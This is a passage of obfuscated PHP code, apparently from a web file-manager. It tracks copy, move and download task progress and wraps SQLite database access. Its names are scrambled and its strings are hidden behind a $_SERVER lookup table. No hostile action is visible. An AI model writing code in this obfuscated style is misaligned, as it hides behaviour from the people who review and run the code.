$ÆşÓœæÙ[1673])); Hook::bind($ÆşÓœæÙ[601], array($this, $ÆşÓœæÙ[1674])); Hook::bind($ÆşÓœæÙ[602], array($this, $ÆşÓœæÙ[1674])); Hook::bind($ÆşÓœæÙ[568], array($this, $ÆşÓœæÙ[1675])); Hook::bind($ÆşÓœæÙ[565], array($this, $ÆşÓœæÙ[1675])); Hook::bind($ÆşÓœæÙ[570], array($this, $ÆşÓœæÙ[1675])); Hook::bind($ÆşÓœæÙ[572], array($this, $ÆşÓœæÙ[1675])); Hook::bind($ÆşÓœæÙ[574], array($this, $ÆşÓœæÙ[1675])); Hook::bind($ÆşÓœæÙ[1676], array($this, $ÆşÓœæÙ[1677])); Hook::bind($ÆşÓœæÙ[591], array($this, $ÆşÓœæÙ[1678])); $this->sourceModelCopyFlag = !1; Hook::bind($ÆşÓœæÙ[1679], array($this, $ÆşÓœæÙ[1680])); Hook::bind($ÆşÓœæÙ[1681], array($this, $ÆşÓœæÙ[1682])); Hook::bind($ÆşÓœæÙ[1683], array($this, $ÆşÓœæÙ[1684])); $’ú‚å›Õ[$ÆşÓœæÙ[1685]] = LNG($ÆşÓœæÙ[1686]); $’ú‚å›Õ[$ÆşÓœæÙ[1687]] = 0; $’ú‚å›Õ[$ÆşÓœæÙ[1688]] = 0; $’ú‚å›Õ[$ÆşÓœæÙ[1050]] = $ÆşÓœæÙ[12]; $’ú‚å›Õ[$ÆşÓœæÙ[1689]] = $ÆşÓœæÙ[12]; $’ú‚å›Õ[$ÆşÓœæÙ[1690]] = 0; $’ú‚å›Õ[$ÆşÓœæÙ[1691]] = 0; $’ú‚å›Õ[$ÆşÓœæÙ[1692]] = 0; if (!$’ú‚å›Õ[$ÆşÓœæÙ[1539]]) { $’ú‚å›Õ[$ÆşÓœæÙ[1539]] = LNG($ÆşÓœæÙ[1693]); } } protected function endAfter() { $ûèØá×Œ =& $_SERVER[¥Ÿ©ÒèÌ]; Hook::unbind($ûèØá×Œ[1667], array($this, $ûèØá×Œ[1668])); Hook::unbind($ûèØá×Œ[1199], array($this, $ûèØá×Œ[1669])); Hook::unbind($ûèØá×Œ[1670], array($this, $ûèØá×Œ[1671])); Hook::unbind($ûèØá×Œ[598], array($this, $ûèØá×Œ[1672])); Hook::unbind($ûèØá×Œ[599], array($this, $ûèØá×Œ[1673])); Hook::unbind($ûèØá×Œ[601], array($this, $ûèØá×Œ[1674])); Hook::unbind($ûèØá×Œ[602], array($this, $ûèØá×Œ[1674])); Hook::unbind($ûèØá×Œ[568], array($this, $ûèØá×Œ[1675])); Hook::unbind($ûèØá×Œ[565], array($this, $ûèØá×Œ[1675])); Hook::unbind($ûèØá×Œ[570], array($this, $ûèØá×Œ[1675])); Hook::unbind($ûèØá×Œ[572], array($this, $ûèØá×Œ[1675])); Hook::unbind($ûèØá×Œ[574], array($this, $ûèØá×Œ[1675])); Hook::unbind($ûèØá×Œ[1676], array($this, $ûèØá×Œ[1677])); Hook::unbind($ûèØá×Œ[591], array($this, $ûèØá×Œ[1678])); Hook::unbind($ûèØá×Œ[1679], array($this, $ûèØá×Œ[1680])); Hook::unbind($ûèØá×Œ[1681], array($this, $ûèØá×Œ[1682])); Hook::unbind($ûèØá×Œ[1683], array($this, $ûèØá×Œ[1684])); } public function copyMoveStart($òœÉåĞ, $•“¢¥é¢, $‰ÌË¼‰Ù, $ØôŞÑñ¯) { $’ñèô¨ª =& $_SERVER[¥Ÿ©ÒèÌ]; self::log($’ñèô¨ª[1694] . $•“¢¥é¢ . $’ñèô¨ª[70] . $ØôŞÑñ¯); $·Ûœæó = rtrim(TEMP_FILES, $’ñèô¨ª[8]); if (substr($•“¢¥é¢, 0, strlen($·Ûœæó)) == $·Ûœæó) { return; } if (substr($ØôŞÑñ¯, 0, strlen($·Ûœæó)) == $·Ûœæó) { return; } $Á…“öÅĞ =& $this->task; $Á…“öÅĞ[$’ñèô¨ª[1695]] = KodIO::transferType($òœÉåĞ, $‰ÌË¼‰Ù); $this->update(); } public function updateAfter() { $ßÚğòœï =& $_SERVER[¥Ÿ©ÒèÌ]; $•ğ¨¢¶Â =& $this->task; if (!$•ğ¨¢¶Â[$ßÚğòœï[753]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($•ğ¨¢¶Â[$ßÚğòœï[1695]] == $ßÚğòœï[1288]) { return; } self::updateTask($•ğ¨¢¶Â); } private static function updateTask(&$ğğü—«£) { $ä‚´øëº =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ğğü—«£[$ä‚´øëº[1695]] == $ä‚´øëº[1183] || $ğğü—«£[$ä‚´øëº[1695]] == $ä‚´øëº[108]) { if ($ğğü—«£[$ä‚´øëº[1689]]) { $ğğü—«£[$ä‚´øëº[1692]] = $ğğü—«£[$ä‚´øëº[1691]] + $ğğü—«£[$ä‚´øëº[1688]]; } } else { if ($ğğü—«£[$ä‚´øëº[1695]] == $ä‚´øëº[1289]) { if ($ğğü—«£[$ä‚´øëº[1689]] == $ä‚´øëº[1183]) { $ğğü—«£[$ä‚´øëº[1692]] = $ğğü—«£[$ä‚´øëº[1691]] + $ğğü—«£[$ä‚´øëº[1688]] * 0.5; } else { if ($ğğü—«£[$ä‚´øëº[1689]] == $ä‚´øëº[108]) { $ğğü—«£[$ä‚´øëº[1692]] = $ğğü—«£[$ä‚´øëº[1691]] + $ğğü—«£[$ä‚´øëº[1687]] * 0.5 + $ğğü—«£[$ä‚´øëº[1688]] * 0.5; } } } } $ğğü—«£[$ä‚´øëº[1641]] = $ğğü—«£[$ä‚´øëº[1692]] / $ğğü—«£[$ä‚´øëº[753]]; if ($ğğü—«£[$ä‚´øëº[1641]] > 0) { $Í¾ªİÒê = timeFloat() - $ğğü—«£[$ä‚´øëº[1643]] - $ğğü—«£[$ä‚´øëº[1646]]; $ğğü—«£[$ä‚´øëº[1647]] = $Í¾ªİÒê * (1 - $ğğü—«£[$ä‚´øëº[1641]]) / $ğğü—«£[$ä‚´øëº[1641]]; } } public function addPath($±ÌÂ¨ì€) { $ê•„µ¢‚ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$±ÌÂ¨ì€) { return; } $ŞÓª‹Â¤ =& $this->task; $ÖƒÔ°‘ª = IO::infoWithChildren($±ÌÂ¨ì€); $ÊÔÙŞ© = $ŞÓª‹Â¤[$ê•„µ¢‚[1696]] ? $ŞÓª‹Â¤[$ê•„µ¢‚[1696]][$ê•„µ¢‚[1697]] : 0; $ŞÓª‹Â¤[$ê•„µ¢‚[1696]] = array($ê•„µ¢‚[1697] => $ÊÔÙŞ© + 1, $ê•„µ¢‚[421] => $ÖƒÔ°‘ª[$ê•„µ¢‚[32]], $ê•„µ¢‚[78] => $ÖƒÔ°‘ª[$ê•„µ¢‚[78]], $ê•„µ¢‚[519] => $ÖƒÔ°‘ª[$ê•„µ¢‚[519]] ? $ÖƒÔ°‘ª[$ê•„µ¢‚[519]] : $ÖƒÔ°‘ª[$ê•„µ¢‚[78]]); if ($ÖƒÔ°‘ª[$ê•„µ¢‚[33]] == $ê•„µ¢‚[192]) { $ŞÓª‹Â¤[$ê•„µ¢‚[776]] += 1; } else { $ŞÓª‹Â¤[$ê•„µ¢‚[776]] += $ÖƒÔ°‘ª[$ê•„µ¢‚[83]][$ê•„µ¢‚[81]]; if ($ÖƒÔ°‘ª[$ê•„µ¢‚[403]]) { $ŞÓª‹Â¤[$ê•„µ¢‚[776]] += $ÖƒÔ°‘ª[$ê•„µ¢‚[83]][$ê•„µ¢‚[82]] + 1; } } $ŞÓª‹Â¤[$ê•„µ¢‚[753]] += $ÖƒÔ°‘ª[$ê•„µ¢‚[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($êÑ©™ˆÌ) { $º¢äåš… =& $_SERVER[¥Ÿ©ÒèÌ]; $Ûüş·³ =& $this->task; $Ûüş·³[$º¢äåš…[1685]] = $êÑ©™ˆÌ[$º¢äåš…[32]]; $Ûüş·³[$º¢äåš…[1050]] = $êÑ©™ˆÌ[$º¢äåš…[32]]; $this->update(); } public function copyFileStart($Ö½Õ»Àä, $™Ó›œ¬Ü, $ñ‡±İÊ, $ŠáÅ¿ÑÉ, $ğ¯“Ñ§ñ, $ö²ñå‚) { $õ·ü¸è½ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÏôÒ½‚· = $ğ¯“Ñ§ñ; if ($ÏôÒ½‚· == $GLOBALS[$õ·ü¸è½[1698]]) { $ÏôÒ½‚· = $GLOBALS[$õ·ü¸è½[1699]]; } $GLOBALS[$õ·ü¸è½[1699]] = $ğ¯“Ñ§ñ; $GLOBALS[$õ·ü¸è½[1698]] = $ö²ñå‚; $å›ÈÉÈ =& $this->task; $å›ÈÉÈ[$õ·ü¸è½[1685]] = $ÏôÒ½‚·; $å›ÈÉÈ[$õ·ü¸è½[1687]] = (int) $Ö½Õ»Àä->size($™Ó›œ¬Ü); $å›ÈÉÈ[$õ·ü¸è½[1688]] = 0; $å›ÈÉÈ[$õ·ü¸è½[1050]] = $õ·ü¸è½[12]; $å›ÈÉÈ[$õ·ü¸è½[1689]] = $õ·ü¸è½[12]; $å›ÈÉÈ[$õ·ü¸è½[1690]] = 0; $ùÔğÛëÛ = $å›ÈÉÈ[$õ·ü¸è½[1687]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($å›ÈÉÈ[$õ·ü¸è½[401]] . $õ·ü¸è½[1700]); if ($ùÔğÛëÛ && file_exists(get_path_father($ŠáÅ¿ÑÉ))) { Cache::set($å›ÈÉÈ[$õ·ü¸è½[401]] . $õ·ü¸è½[1700], $ŠáÅ¿ÑÉ); $å›ÈÉÈ[$õ·ü¸è½[1661]] = array($õ·ü¸è½[1701], $õ·ü¸è½[1702]); } $this->update(0, $ùÔğÛëÛ); } public static function updateCopyLocalFileSize($“Û•ğ€¶) { $î¨áÊ˜™ =& $_SERVER[¥Ÿ©ÒèÌ]; $ğª£¦à„ = Cache::get($“Û•ğ€¶[$î¨áÊ˜™[401]] . $î¨áÊ˜™[1700]); if (!$ğª£¦à„ || !file_exists($ğª£¦à„)) { return $“Û•ğ€¶; } $“Û•ğ€¶[$î¨áÊ˜™[1688]] = @filesize($ğª£¦à„); $“Û•ğ€¶[$î¨áÊ˜™[1692]] += $“Û•ğ€¶[$î¨áÊ˜™[1688]]; self::updateTask($“Û•ğ€¶); return $“Û•ğ€¶; } public function copyFileEnd($¬à¢Œ¤‹, $şë² áØ, $³Ï±Ğ¿, $ÕÑµú±ç, $—ê½Ñò, $Öò¢Ÿƒ) { $¤õ«İÊİ =& $_SERVER[¥Ÿ©ÒèÌ]; $ø£ò·—ò =& $this->task; $ø£ò·—ò[$¤õ«İÊİ[1688]] = $ø£ò·—ò[$¤õ«İÊİ[1687]]; $ø£ò·—ò[$¤õ«İÊİ[1689]] = $¤õ«İÊİ[12]; unset($ø£ò·—ò[$¤õ«İÊİ[1661]]); if ($—ê½Ñò == $ø£ò·—ò[$¤õ«İÊİ[1685]]) { $ø£ò·—ò[$¤õ«İÊİ[1691]] += $ø£ò·—ò[$¤õ«İÊİ[1687]]; $ø£ò·—ò[$¤õ«İÊİ[1692]] = $ø£ò·—ò[$¤õ«İÊİ[1691]]; $this->update(1); } else { $this->update(); $ø£ò·—ò[$¤õ«İÊİ[1688]] = 0; } Cache::remove($ø£ò·—ò[$¤õ«İÊİ[401]] . $¤õ«İÊİ[1700]); self::log($¤õ«İÊİ[1703] . $şë² áØ . $¤õ«İÊİ[70] . $ÕÑµú±ç . $¤õ«İÊİ[226] . $—ê½Ñò . $¤õ«İÊİ[1704] . $ø£ò·—ò[$¤õ«İÊİ[1685]]); } public function updateFileEnd($¸ÅîÄƒ, $ØŒëØ‡‰) { $ş«ˆ­ˆÜ =& $_SERVER[¥Ÿ©ÒèÌ]; $‘˜Óæ»¥ =& $this->task; $‘˜Óæ»¥[$ş«ˆ­ˆÜ[1685]] = $¸ÅîÄƒ; $‘˜Óæ»¥[$ş«ˆ­ˆÜ[1687]] = $ØŒëØ‡‰; $‘˜Óæ»¥[$ş«ˆ­ˆÜ[1691]] += $ØŒëØ‡‰; $‘˜Óæ»¥[$ş«ˆ­ˆÜ[1692]] = $‘˜Óæ»¥[$ş«ˆ­ˆÜ[1691]]; $this->update(1); self::log($ş«ˆ­ˆÜ[1705] . $¸ÅîÄƒ); } public function sourceModelCopy($÷æ†·®Ù) { $¼¸´€ê =& $_SERVER[¥Ÿ©ÒèÌ]; $á™àè‡› = $÷æ†·®Ù[0]; $µßâÎ‡ı = $÷æ†·®Ù[1]; $ÊÑåİÚÂ =& $this->task; $this->sourceModelCopyFlag = !0; $Æ«ÄÍ„ = 0; switch ($á™àè‡›) { case $¼¸´€ê[566]: $Æ«ÄÍ„ = 1; break; case $¼¸´€ê[569]: $ÊÑåİÚÂ[$¼¸´€ê[1685]] = $µßâÎ‡ı[$¼¸´€ê[32]]; break; case $¼¸´€ê[571]: $Æ«ÄÍ„ = intval($÷æ†·®Ù[$¼¸´€ê[384]] * 0.4); break; case $¼¸´€ê[573]: $Æ«ÄÍ„ = intval($÷æ†·®Ù[$¼¸´€ê[384]] * 0.2); break; case $¼¸´€ê[575]: $Æ«ÄÍ„ = intval($÷æ†·®Ù[$¼¸´€ê[384]] * 0.4); break; } $this->update($Æ«ÄÍ„); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ä£‚ß“õ, $”ÜĞÇº) { $»Ñì™Û‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->sourceModelCopyFlag = !0; $Åà˜—©É = 1; if (isset($ä£‚ß“õ[$»Ñì™Û‚[83]])) { $Åà˜—©É = $ä£‚ß“õ[$»Ñì™Û‚[83]][$»Ñì™Û‚[81]] + $ä£‚ß“õ[$»Ñì™Û‚[83]][$»Ñì™Û‚[82]] + 1; } $this->update($Åà˜—©É); $this->sourceModelCopyFlag = !1; } public function sourceMove($«ÅÄÑ¿ç) { $this->sourceRemove($«ÅÄÑ¿ç, !1); } public function curlProgress($ûúËÊŒé, $¥ôÍ•Å, $æ‘†ã©•, $ù÷—¸èˆ, $¶ÅÉ ¦ƒ) { $›Ò¦¸Ó =& $_SERVER[¥Ÿ©ÒèÌ]; $ÂÏÌ‹¢İ =& $this->task; if ($¶ÅÉ ¦ƒ > 0) { $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1050]] = $›Ò¦¸Ó[1706]; $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1689]] = $›Ò¦¸Ó[108]; if ($ÂÏÌ‹¢İ[$›Ò¦¸Ó[1687]]) { $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1688]] = $¶ÅÉ ¦ƒ; } if ($ÂÏÌ‹¢İ[$›Ò¦¸Ó[1690]]) { $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1688]] = $¶ÅÉ ¦ƒ + $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1690]]; } } else { if ($æ‘†ã©• > 0) { if ($ÂÏÌ‹¢İ[$›Ò¦¸Ó[1687]] == $¥ôÍ•Å) { $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1688]] = $æ‘†ã©•; $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1050]] = $›Ò¦¸Ó[1707]; $ÂÏÌ‹¢İ[$›Ò¦¸Ó[1689]] = $›Ò¦¸Ó[1183]; } } } $this->update(); } public function curlProgressStart($ßûˆñÇœ) { } public function curlProgressEnd($ùÒÊØæœ) { $•‘ ºÃ =& $_SERVER[¥Ÿ©ÒèÌ]; $¥Ú–Ï =& $this->task; $ÊÅÑ€½È = curl_getinfo($ùÒÊØæœ); $¹øÓ—×µ = $ÊÅÑ€½È[$•‘ ºÃ[1708]]; if ($¹øÓ—×µ == -1) { $¹øÓ—×µ = $ÊÅÑ€½È[$•‘ ºÃ[1709]]; } if ($¥Ú–Ï[$•‘ ºÃ[1689]] == $•‘ ºÃ[108] && $¹øÓ—×µ) { $¥Ú–Ï[$•‘ ºÃ[1690]] += $¹øÓ—×µ; } $this->update(); } } goto d¹à²Ì; C¨—Ç°²ˆä: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $È´–çØ¿ =& $_SERVER[¥Ÿ©ÒèÌ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$È´–çØ¿[6]] =& $config; $this->values[$È´–çØ¿[7]] =& $in; $this->tpl = TEMPLATE . MOD . $È´–çØ¿[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ä š–…) { if (1 === func_num_args()) { $this->{$Ä š–…} = new $Ä š–…(); } else { $ûÑŸğÌë = new ReflectionClass($Ä š–…); $’¸¹Ÿô¤ = func_get_args(); array_shift($’¸¹Ÿô¤); $this->{$Ä š–…} = $ûÑŸğÌë->newInstanceArgs($’¸¹Ÿô¤); } return $this->{$Ä š–…}; } public function routeBind($ÍÜÓğÅù, $‘Æ•Ã, $“öÁ¦ = 3) { $¬½–°»À =& $_SERVER[¥Ÿ©ÒèÌ]; $Æ¢®ğ²¿ = $this->in[$¬½–°»À[9]]; $ÍÜÓğÅù = str_replace($¬½–°»À[10], $¬½–°»À[11], trim(trim($ÍÜÓğÅù, $¬½–°»À[8]), $¬½–°»À[12])); if (!$ÍÜÓğÅù || count($Æ¢®ğ²¿) <= $“öÁ¦) { return !1; } $ô™ó–…ë = !0; $Ê‘û³Ë = explode($¬½–°»À[8], $ÍÜÓğÅù); for ($…åÙÛ®¥ = 0; $…åÙÛ®¥ < count($Ê‘û³Ë); $…åÙÛ®¥++) { if ($Ê‘û³Ë[$…åÙÛ®¥] != $Æ¢®ğ²¿[$“öÁ¦ + $…åÙÛ®¥]) { $ô™ó–…ë = !1; break; } } if (!$ô™ó–…ë) { return; } call_user_func_array(array($this, $‘Æ•Ã), array()); } public function routeArgs($®õõ…É¦ = 3) { $ìüÈÇï¬ = $this->in[$_SERVER[¥Ÿ©ÒèÌ][9]]; if (count($ìüÈÇï¬) <= $®õõ…É¦) { return array(); } $¨”Ä‹åÕ = array(); for ($Äµ³ÄÜ¢ = $®õõ…É¦; $Äµ³ÄÜ¢ < count($ìüÈÇï¬); $Äµ³ÄÜ¢ += 2) { $¨”Ä‹åÕ[$ìüÈÇï¬[$Äµ³ÄÜ¢]] = $ìüÈÇï¬[$Äµ³ÄÜ¢ + 1]; $this->in[$ìüÈÇï¬[$Äµ³ÄÜ¢]] = $ìüÈÇï¬[$Äµ³ÄÜ¢ + 1]; } return $¨”Ä‹åÕ; } protected function assign($²£ùç°±, $¾Ò®†ğó) { $this->values[$²£ùç°±] = $¾Ò®†ğó; } protected function display($òäìÃ¥‹) { ob_end_clean(); extract($this->values); require $this->tpl . $òäìÃ¥‹; } } class DbSqliteBase extends Db { public function __construct($µè¡—Óá = '') { $©ˆÚ™Ï =& $_SERVER[¥Ÿ©ÒèÌ]; if (!extension_loaded($©ˆÚ™Ï[13])) { think_exception(think_lang($©ˆÚ™Ï[14]) . $©ˆÚ™Ï[15]); } if (!empty($µè¡—Óá)) { if (!isset($µè¡—Óá[$©ˆÚ™Ï[16]])) { $µè¡—Óá[$©ˆÚ™Ï[16]] = 438; } $this->config = $µè¡—Óá; if (empty($this->config[$©ˆÚ™Ï[17]])) { $this->config[$©ˆÚ™Ï[17]] = array(); } } } public function connect($ÅùŸÛ¬Ô = '', $†¤çõºÈ = 0) { $…ïïùæù =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->linkID[$†¤çõºÈ])) { if (empty($ÅùŸÛ¬Ô)) { $ÅùŸÛ¬Ô = $this->config; } $‘äÅŞ­ù = !empty($ÅùŸÛ¬Ô[$…ïïùæù[17]][$…ïïùæù[18]]) ? $ÅùŸÛ¬Ô[$…ïïùæù[17]][$…ïïùæù[18]] : $this->pconnect; $Õ”¹œ© = $‘äÅŞ­ù ? $…ïïùæù[19] : $…ïïùæù[20]; $this->linkID[$†¤çõºÈ] = $Õ”¹œ©($ÅùŸÛ¬Ô[$…ïïùæù[21]], $ÅùŸÛ¬Ô[$…ïïùæù[16]]); if (!$this->linkID[$†¤çõºÈ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$†¤çõºÈ], 30000); if (1 != think_config($…ïïùæù[22])) { unset($this->config); } } return $this->linkID[$†¤çõºÈ]; } public function free() { $this->queryID = null; } public function query($ëØí¥…Ç) { $ûğšùƒ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ëØí¥…Ç; if ($this->queryID) { $this->free(); } think_action_status($ûğšùƒ[23], 1); think_status($ûğšùƒ[24]); $this->queryID = sqlite_query($this->_linkID, $ëØí¥…Ç); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‘»ë‰ØĞ = $this->getAll(); return $‘»ë‰ØĞ; } } public function execute($åµí¡¥İ) { $“·ÖªÈ‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $åµí¡¥İ; if ($this->queryID) { $this->free(); } think_action_status($“·ÖªÈ‚[25], 1); think_status($“·ÖªÈ‚[24]); $“ÒáĞ• = sqlite_exec($this->_linkID, $åµí¡¥İ); $this->debug(); if (!1 === $“ÒáĞ•) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¥Ÿ©ÒèÌ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯ß· ƒÁ = sqlite_query($this->_linkID, $_SERVER[¥Ÿ©ÒèÌ][27]); if (!$¯ß· ƒÁ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ì˜¤º¨‰ = sqlite_query($this->_linkID, $_SERVER[¥Ÿ©ÒèÌ][28]); if (!$ì˜¤º¨‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ù¸ƒ’âİ = array(); if ($this->numRows > 0) { for ($ÕËæ€¡Ä = 0; $ÕËæ€¡Ä < $this->numRows; $ÕËæ€¡Ä++) { $Ù¸ƒ’âİ[$ÕËæ€¡Ä] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ù¸ƒ’âİ; } public function getFields($º”‡ÇÊŒ) { $ôı¯Ç‡È =& $_SERVER[¥Ÿ©ÒèÌ]; $ü“Ñ½ËØ = $this->query($ôı¯Ç‡È[29] . $º”‡ÇÊŒ . $ôı¯Ç‡È[30]); $ñ‰££† = array(); if ($ü“Ñ½ËØ) { foreach ($ü“Ñ½ËØ as $È¥¹÷Ñ„ => $Ò”ßŸƒŠ) { $ñ‰££†[$Ò”ßŸƒŠ[$ôı¯Ç‡È[31]]] = array($ôı¯Ç‡È[32] => $Ò”ßŸƒŠ[$ôı¯Ç‡È[31]], $ôı¯Ç‡È[33] => $Ò”ßŸƒŠ[$ôı¯Ç‡È[34]], $ôı¯Ç‡È[35] => (bool) ($Ò”ßŸƒŠ[$ôı¯Ç‡È[36]] === $ôı¯Ç‡È[12]), $ôı¯Ç‡È[37] => $Ò”ßŸƒŠ[$ôı¯Ç‡È[38]], $ôı¯Ç‡È[39] => strtolower($Ò”ßŸƒŠ[$ôı¯Ç‡È[40]]) == $ôı¯Ç‡È[41], $ôı¯Ç‡È[42] => strtolower($Ò”ßŸƒŠ[$ôı¯Ç‡È[43]]) == $ôı¯Ç‡È[44]); } } return $ñ‰££†; } public function getTables($ëèî¨°â = '') { $°Û©ÆŸã =& $_SERVER[¥Ÿ©ÒèÌ]; $›Ñ¼ˆ¹Ü = $this->query($°Û©ÆŸã[45] . $°Û©ÆŸã[46] . $°Û©ÆŸã[47]); $Ê «‰ÌË = array(); foreach ($›Ñ¼ˆ¹Ü as $Ìè©ÊÈ¼ => $–¯¯å¹ı) { $Ê «‰ÌË[$Ìè©ÊÈ¼] = current($–¯¯å¹ı); } return $Ê «‰ÌË; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $úÅÜ© =& $_SERVER[¥Ÿ©ÒèÌ]; $ÀÁë¯ = sqlite_last_error($this->_linkID); $this->error = $ÀÁë¯ . $úÅÜ©[4] . sqlite_error_string($ÀÁë¯); if ($úÅÜ©[12] != $this->queryStr) { $this->error .= LNG($úÅÜ©[48]) . $this->queryStr; } think_trace($this->error, $úÅÜ©[12], $úÅÜ©[49]); return $this->error; } public function escapeString($ŞÓÎ³™á) { return sqlite_escape_string($ŞÓÎ³™á); } public function parseLimit($ÅÉÇæığ) { $¹É·º™¹ =& $_SERVER[¥Ÿ©ÒèÌ]; $ç…›ã³ì = $¹É·º™¹[12]; if (!empty($ÅÉÇæığ)) { $ÅÉÇæığ = explode($¹É·º™¹[50], $ÅÉÇæığ); if (count($ÅÉÇæığ) > 1) { $ç…›ã³ì .= $¹É·º™¹[51] . $ÅÉÇæığ[1] . $¹É·º™¹[52] . $ÅÉÇæığ[0] . $¹É·º™¹[53]; } else { $ç…›ã³ì .= $¹É·º™¹[51] . $ÅÉÇæığ[0] . $¹É·º™¹[53]; } } return $ç…›ã³ì; } } class DbSqlite3Base extends Db { public function __construct($ıöÉî = '') { $©Æ¤ûš¥ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!class_exists($©Æ¤ûš¥[54])) { think_exception(think_lang($©Æ¤ûš¥[14]) . $©Æ¤ûš¥[55]); } if (!empty($ıöÉî)) { if (!isset($ıöÉî[$©Æ¤ûš¥[16]])) { $ıöÉî[$©Æ¤ûš¥[16]] = 438; } $this->config = $ıöÉî; if (empty($this->config[$©Æ¤ûš¥[17]])) { $this->config[$©Æ¤ûš¥[17]] = array(); } } } public function connect($Óã —¿³ = '', $â‰¨êÊÃ = 0) { $§‘ìå…ö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->linkID[$â‰¨êÊÃ])) { if (empty($Óã —¿³)) { $Óã —¿³ = $this->config; } $this->linkID[$â‰¨êÊÃ] = new SQLite3($Óã —¿³[$§‘ìå…ö[21]]); if (!$this->linkID[$â‰¨êÊÃ]) { think_exception($this->linkID[$â‰¨êÊÃ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$â‰¨êÊÃ]->busyTimeout(30000); if (1 != think_config($§‘ìå…ö[22])) { unset($this->config); } } return $this->linkID[$â‰¨êÊÃ]; } public function free() { $this->queryID = null; } public function query($şØ”Şµ¸) { $‡ÙşÁ“Ÿ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $şØ”Şµ¸; if ($this->queryID) { $this->free(); } think_action_status($‡ÙşÁ“Ÿ[23], 1); think_status($‡ÙşÁ“Ÿ[24]); $this->queryID = $this->_linkID->query($şØ”Şµ¸); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Å÷õïÁÇ = $this->getAll(); $this->numRows = count($Å÷õïÁÇ); return $Å÷õïÁÇ; } } public function execute($ÎÏã¾—Õ) { $”â®ßÅÁ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÎÏã¾—Õ; if ($this->queryID) { $this->free(); } think_action_status($”â®ßÅÁ[25], 1); think_status($”â®ßÅÁ[24]); $Œ„¨Ş‘È = $this->_linkID->exec($ÎÏã¾—Õ); $this->debug(); if (!1 === $Œ„¨Ş‘È) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¥Ÿ©ÒèÌ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $è†öŸ° = $this->_linkID->query($_SERVER[¥Ÿ©ÒèÌ][27]); if (!$è†öŸ°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿì³Õ‰ù = $this->_linkID->query($_SERVER[¥Ÿ©ÒèÌ][28]); if (!$Ÿì³Õ‰ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ƒÖî¡ç— = array(); while ($È‘®²İÁ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ƒÖî¡ç—[] = $È‘®²İÁ; } $this->queryID->reset(); return $ƒÖî¡ç—; } public function getFields($Û°¶óú¤) { $ğ„Ö±òö =& $_SERVER[¥Ÿ©ÒèÌ]; $É–¸ÃğÁ = $this->query($ğ„Ö±òö[29] . $Û°¶óú¤ . $ğ„Ö±òö[30]); $ˆäıŠ¡´ = array(); if ($É–¸ÃğÁ) { foreach ($É–¸ÃğÁ as $¸ÁÔ²†ø => $¾äå‹à) { $ˆäıŠ¡´[$¾äå‹à[$ğ„Ö±òö[32]]] = array($ğ„Ö±òö[32] => $¾äå‹à[$ğ„Ö±òö[32]], $ğ„Ö±òö[33] => $¾äå‹à[$ğ„Ö±òö[33]], $ğ„Ö±òö[35] => (bool) ($¾äå‹à[$ğ„Ö±òö[35]] === $ğ„Ö±òö[12]), $ğ„Ö±òö[37] => $¾äå‹à[$ğ„Ö±òö[56]], $ğ„Ö±òö[39] => (bool) $¾äå‹à[$ğ„Ö±òö[57]], $ğ„Ö±òö[42] => (bool) 